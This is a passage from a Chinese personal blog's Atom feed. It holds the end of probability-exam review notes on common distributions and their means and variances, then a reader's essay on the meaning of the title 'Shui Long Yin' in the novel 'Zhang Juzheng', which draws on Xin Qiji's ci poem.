style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>相和性</li></ul></li></ul><h2 id="常见分布"><a class="markdownIt-Anchor" href="#常见分布"></a> 常见分布</h2><ul><li>二项分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mtext>B</mtext><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \text{B}(n, p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>=</mo><mi>n</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">E=np</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo>=</mo><mi>n</mi><mi>p</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D=np(1-p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></li></ul></li><li>均匀分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mtext>U</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \text{U}(a, b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">U</span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></li><li>正态分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mtext>N</mtext><mo stretchy="false">(</mo><mi>μ</mi><mo separator="true">,</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \text{N}(\mu, \sigma^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">N</span></span><span class="mopen">(</span><span class="mord mathdefault">μ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>泊松分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mi>π</mi><mo stretchy="false">(</mo><mi>λ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \pi(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mopen">(</span><span class="mord mathdefault">λ</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>λ</mi></mrow><annotation encoding="application/x-tex">E(X)=D(X)=\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">λ</span></span></span></span></li></ul></li><li>指数分布<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mtext>e</mtext><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \text{e}(\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">e</span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>θ</mi><mi mathvariant="normal">，</mi><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>θ</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">E(X)=θ ，D(X)=θ^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></li></ul></li><li>几何分布<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mtext>Ge</mtext><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim \text{Ge}(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Ge</span></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>p</mi></mfrac></mrow><annotation encoding="application/x-tex">E(X)=\frac{1}{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.326216em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>1</mn><mo>−</mo><mi>p</mi></mrow><msup><mi>p</mi><mn>2</mn></msup></mfrac></mrow><annotation encoding="application/x-tex">D(X)=\frac{1-p}{p^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.378324em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.897216em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul></li></ul><p><img src="/2024/07/03/%E6%A6%82%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%80%83%E7%82%B9/1.png" alt="常见分布的期望方差"><br><img src="/2024/07/03/%E6%A6%82%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%80%83%E7%82%B9/2.png" alt="三大分布"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;随机事件及概率&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#随机事件及概率&quot;&gt;&lt;/a&gt; 随机事件及概率&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;条件概率——全概率公式+贝叶斯公式&lt;/li&gt;
&lt;li&gt;古典概型&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于《张居正  第二卷：水龙吟》的题目含义</title>
    <link href="http://example.com/2024/06/24/%E5%85%B3%E4%BA%8E%E3%80%8A%E5%BC%A0%E5%B1%85%E6%AD%A3%20%20%E7%AC%AC%E4%BA%8C%E5%8D%B7%EF%BC%9A%E6%B0%B4%E9%BE%99%E5%90%9F%E3%80%8B%E7%9A%84%E9%A2%98%E7%9B%AE%E5%90%AB%E4%B9%89/"/>
    <id>http://example.com/2024/06/24/%E5%85%B3%E4%BA%8E%E3%80%8A%E5%BC%A0%E5%B1%85%E6%AD%A3%20%20%E7%AC%AC%E4%BA%8C%E5%8D%B7%EF%BC%9A%E6%B0%B4%E9%BE%99%E5%90%9F%E3%80%8B%E7%9A%84%E9%A2%98%E7%9B%AE%E5%90%AB%E4%B9%89/</id>
    <published>2024-06-23T16:44:05.710Z</published>
    <updated>2024-06-23T16:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>读罢《张居正》的第二卷，我发现这一卷的书名并没有很明确地在书中进行解析。第一卷所题“木兰歌”确是在卷末由玉娘为饯别高拱而在筵席上所弹唱的曲子《木兰歌》所提到，这首词精炼地<strong>概括</strong>了整卷书的内容，即张居正高拱两个大权力集团间的斗争。</p><blockquote><p>世上事一半儿荒唐一半儿险恶，<br>皇城中尔虞我诈，衙门内铁马金戈。<br>羽扇纶巾，说是些大儒大雅，<br>却为何我揪着你，你撕着我，<br>制陷阱、使绊子，一个比一个更利索。<br>呜呼！今日里拳头上跑马抖威风，<br>到明日败走麦城，<br>只落得形影相吊英雄泪滂沱。<br>只可叹，荣辱兴衰转瞬间。<br>天涯孤旅，古道悲风，<br>都在唱那一个字：<br>错！错！！错！！！    ——《张居正 第一卷：木兰歌》</p></blockquote><p>第二卷书围绕“胡椒苏木折俸”一事展开，讲述的是张居正当上首辅而进行“京察”改革以及过程中遇到的许多阻力（高拱门人捣乱、与李太后冯保等人的权力制衡…）。关于第二卷名《水龙吟》，我在读之前便在想作者要以一种什么手法来带出这个名字，遗憾的是读完也没能理解这三个字（我的文学水平太低了…）。首先我对这个词牌名不太了解，只读过几首这个词牌的词，一般每个词牌名都会有它名字的<strong>来源</strong>。</p><blockquote><p>据说，<u>“水龙吟”最早是南北朝时北齐的一组古琴曲</u>，据《北齐书》卷二十九“郑述祖传”：“述祖能鼓琴，自造《龙吟十弄》，云尝梦人弹琴，寤而写得。当时以为绝妙。”同时，<u>汉马融《长笛赋》云：“近世羌笛从羌起，羌人伐竹未及已。龙吟水中不见己，截竹吹之声相似。”故人们也以龙吟喻笛声</u>，如南朝梁<a href="https://baike.baidu.com/item/%E5%88%98%E5%AD%9D%E5%85%88/3844125?fromModule=lemma_inlink">刘孝先</a>《咏竹诗》：“谁能制长笛，当为吐龙吟。”南北朝诗人<a href="https://baike.baidu.com/item/%E5%BA%BE%E4%BF%A1/543904?fromModule=lemma_inlink">庾信</a>《对酒诗》：“惟有龙吟笛，桓伊能独吹。”  ——百度百科</p></blockquote><p>古琴、笛，无论哪个说法都和音乐有关，整本书关于音乐的描写不多，一部分笔墨描写的是李太后昭宁寺敬香时所奏的佛乐，一部分笔墨用来写窑子青楼里的声色犬马，很明显这些都和整卷书的主题无关。因此可以断言作者取《水龙吟》一名<strong>并非是从词牌名起源中的到灵感</strong>。</p><p>那么考虑这个<strong>词牌常用来表达什么主题</strong>。“它（《水龙吟》）是词牌名，宜用以抒写激奋情思，气势雄浑，正应了第二部的基调。”这个百度搜出来第一个关于标题含义的观点我不全认可。首先关于词牌是否“宜用以抒写激奋情思”：我读过的词不多，一首是辛弃疾的《登建康赏心亭》，一首是苏轼的《次韵章质夫杨花词》，一首是秦观的《小楼连苑横空》，这几首词都不是很奋进向上、激昂卓越的，<strong>反而是有一种空有抱负而无法施展的落寞感伤</strong>。再者关于这卷书的基调：这卷书讲张居正刚上任首辅一把手便想大做改革，实现强国富民的理想，这确实很“激奋”，但谈不上所谓“气势雄浑”。因为张居正新官上任，要面对的是隆庆一朝多年积弊，而且要实现自己的伟大抱负，对外要处理好和其他官员政党的关系，对内还要看着李太后的“皇权”眼色行事，纵使心中理想澎湃，但张居正还是受到许多挫折与打击，再说“激奋”其实已经太过了。</p><p>我猜测作者应该是<strong>取意于某首《水龙吟》</strong>。苏轼《次韵章质夫杨花词》中《水龙吟》的“水”是离人之泪，辛弃疾《登建康赏心亭》中《水龙吟》的“水”是英雄之泪，这两首《水龙吟》应该大家比较耳熟能详，如果真如我所猜的那样（这样普罗大众也都能理解），那标题必然是取意自后者。</p><blockquote><p>楚天千里清秋，水随天去秋无际。遥岑远目，献愁供恨，玉簪螺。落日楼头，断鸿声里，江南游子。把吴钩看了，栏杆拍遍，无人会，登临意。</p><p>休说鲈鱼堪脍，尽西风，季鹰归未？求田问舍，怕应羞见，刘郎才气。可惜流年，忧愁风雨，树犹如此！倩何人唤取，红巾翠袖，揾英雄泪！  ——辛弃疾《水龙吟·登建康赏心亭》</p></blockquote><p>分析这首词主旨大意（梦回中学），我们知道：全词通过写景和联想抒写了作者（辛弃疾）恢复中原国土，统一祖国的<strong>抱负和愿望无法实现的失意的感慨</strong>，深刻揭示了英雄志士<strong>有志难酬、报国无门、抑郁悲愤的苦闷心情</strong>，极大地表现了词人诚挚无私的爱国情怀。</p><p>透过这首词看张居正，他不就是彼时的辛弃疾吗！面对京察过程中“忧愁风雨”般的种种阻力，张居正有许多愁苦，但都一一化解。纵使辛弃疾把栏杆拍遍，也没有办法实现他的报国理想。但张居正不同，他作为大明首辅一人之下万人之上，有实权在握，心中的宏伟理想也能一步步实现，只不过需要步步为营以及沉着应对各种变数。</p><p>清代谭献在《谭评词辩》评价稼轩《水龙吟》：“裂竹之声，何尝不潜气内转”，在第二卷《水龙吟》中张居正不正如词评所说“潜气内转”吗？期待第三卷中张居正会如何把握朝政，开创“万历新政”。</p><hr><p>不过这第三卷恐怕得考完试才能看了，现在要面对的是严酷的<strong>期末学习周</strong>！！！TAT😭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;读罢《张居正》的第二卷，我发现这一卷的书名并没有很明确地在书中进行解析。第一卷所题“木兰歌”确是在卷末由玉娘为饯别高拱而在筵席上所弹唱的曲子《木兰歌》所提到，这首词精炼地&lt;strong&gt;概括&lt;/strong&gt;了整卷书的内容，即张居正高拱两个大权力集团间的斗争。&lt;/p&gt;
&lt;b</summary>
      
    
    
    
    
  </entry>
  
</feed>
